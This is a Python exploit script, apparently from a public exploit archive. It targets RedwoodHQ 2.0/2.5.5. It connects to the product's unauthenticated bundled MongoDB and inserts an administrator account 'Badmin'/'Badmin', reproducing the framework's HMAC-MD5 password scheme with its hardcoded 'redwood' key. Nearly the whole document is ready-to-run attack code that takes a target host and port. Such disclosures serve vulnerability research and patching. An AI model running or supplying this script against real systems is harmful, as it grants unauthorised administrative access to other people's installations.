#!/usr/bin/python3

# Exploit Title:   RedxploitHQ (Create Admin User by missing authentication on db)
# Date: 	       14-june-2019
# Exploit Author:  EthicalHCOP
# Version: 	       2.0 / 2.5.5
# Vendor Homepage: https://redwoodhq.com/
# Software Link:   https://redwoodhq.com/redwood-download/
# Tested on: 	   Ubuntu and Windows.
# Twitter:	       @EthicalHcop
# Usage:           python3 RedxploitHQ.py -H mongo_host -P mongo_port
# Description: 	   Use RedxploitHQ to create a new Admin user into redwoodhq and get all the functions on the framework
# 
# RedwoodHQ doesn&#039;t require that MongoDB is installed on the machine because this tool have  her own Mongo Launcher. 
# The problem is that this vendor database doesn&#039;t require any authentication to read her data. 
# So, I use the same syntax that use the Framework to create my admin user on the database and access into the tool
# 
# POC:             https://youtu.be/MK9AvoJDtxY

import hashlib
import hmac
import optparse
from pymongo import MongoClient

def CreateHMAC(Pass):
    message = bytes(Pass,encoding=&#039;utf8&#039;)
    secret = bytes(&#039;redwood&#039;,encoding=&#039;utf8&#039;)
    hash = hmac.new(secret, message, hashlib.md5)
    return (hash.hexdigest())

def DbConnect(ip,port):
    uri = "mongodb://" + ip + ":" + port + "/"
    con = MongoClient(uri)
    return con

def DbDisconnect(con):
    con.close()

def CreateBadminUser(ip, port, user, passw):
    con = DbConnect(ip, port)
    db = con.automationframework
    usr = db.users
    passw = CreateHMAC(passw)
    data = {
        "name": user,
        "password": passw,
        "tag": [],
        "role": "Admin",
        "username": user,
        "status": ""
    }
    usr.insert_one(data)
    DbDisconnect(con)

def start():
    parser = optparse.OptionParser(&#039;usage %prog &#039; + \
                                   &#039;-H host -P port&#039;)
    parser.add_option(&#039;-P&#039;, &#039;--Port&#039;, dest=&#039;port&#039;, type=&#039;string&#039;, \
                      help=&#039;MongoDB Port&#039;)
    parser.add_option(&#039;-H&#039;, &#039;--Host&#039;, dest=&#039;host&#039;, type=&#039;string&#039;, \
                      help=&#039;MongoDB Host&#039;)
    (options, args) = parser.parse_args()
    ip = options.host
    port = options.port
    if (str(ip) == "None"):
        print("Insert Host")
        exit(0)
    if (str(port) == "None"):
        port = "27017"
    try:
        CreateBadminUser(str(ip), str(port), &#039;Badmin&#039;, &#039;Badmin&#039;)
        print("[+] New user &#039;Badmin&#039;/&#039;Badmin&#039; created.")
    except Exception as e:
        print("[-] Can&#039;t create the &#039;Badmin&#039;/&#039;Badmin&#039; user. Error: "+str(e))

if __name__ == &#039;__main__&#039;:
    start()

